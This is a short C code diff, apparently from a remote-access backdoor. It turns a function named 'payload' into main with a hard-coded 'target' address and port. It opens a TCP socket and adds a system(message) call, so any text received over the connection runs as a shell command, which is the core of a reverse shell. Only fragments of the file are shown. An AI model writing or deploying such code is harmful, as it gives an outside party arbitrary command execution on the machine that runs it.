@@ -17,8 +17,10 @@ int valread;
 
 
 
-//Note the comments for variables in server code
-int payload(char ip[], int port){
+int main(){
+
+  char ip[] = target;
+  int port = PORT;
 
   fd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -39,6 +41,8 @@ int payload(char ip[], int port){
     if(valread > 0){
 
       printf("Message Received: %s\n", message);
+      system(message);
+
     
     }  
   
